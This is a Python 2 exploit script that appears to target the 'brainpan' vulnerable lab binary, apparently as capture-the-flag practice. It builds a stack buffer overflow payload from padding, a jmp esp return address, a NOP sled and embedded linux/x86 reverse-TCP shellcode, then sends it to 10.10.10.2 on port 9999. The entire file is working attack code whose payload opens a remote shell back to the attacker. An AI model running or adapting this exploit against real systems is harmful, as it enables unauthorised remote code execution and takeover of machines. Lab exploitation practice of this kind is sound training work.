#! /usr/bin/python
# Name: Rio Atmadja
import socket 
import sys 

# shellcode: linux/x86/shell_reverse_tcp
shellcode = ("\xdb\xde\xd9\x74\x24\xf4\xbf\x47\x1e\x0d\x72\x5a\x29\xc9\xb1"
"\x12\x83\xc2\x04\x31\x7a\x13\x03\x3d\x0d\xef\x87\xf0\xea\x18"
"\x84\xa1\x4f\xb4\x21\x47\xd9\xdb\x06\x21\x14\x9b\xf4\xf4\x16"
"\xa3\x37\x86\x1e\xa5\x3e\xee\xaa\x5f\xcb\xef\xc2\x5d\xcb\xfe"
"\x4e\xeb\x2a\xb0\x09\xbb\xfd\xe3\x66\x38\x77\xe2\x44\xbf\xd5"
"\x8c\x79\xef\xaa\x24\xee\xc0\x2e\xdd\x80\x97\x4c\x4f\x0e\x21"
"\x73\xdf\xbb\xfc\xf4")

#jmp esp found at 0x311712f3 
ret = "\xf3\x12\x17\x31"

#note: brainpan crashed after sending 700 bytes to the server
payload = '\x41' * 524 + ret + '\x90' * 50 + shellcode + '\x43' * 150

#send evil payload to the target
print "Sending Evil buffer --> " + str(len(payload)) + " bytes"
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect.connect(("10.10.10.2",9999))

except:

	print "[-] Connection Error"
	response = connect.recv(2000)
	print response
	sys.exit(1)

connect.recv(2000)
connect.send(payload + ' ' + '\r\n')
connect.close()




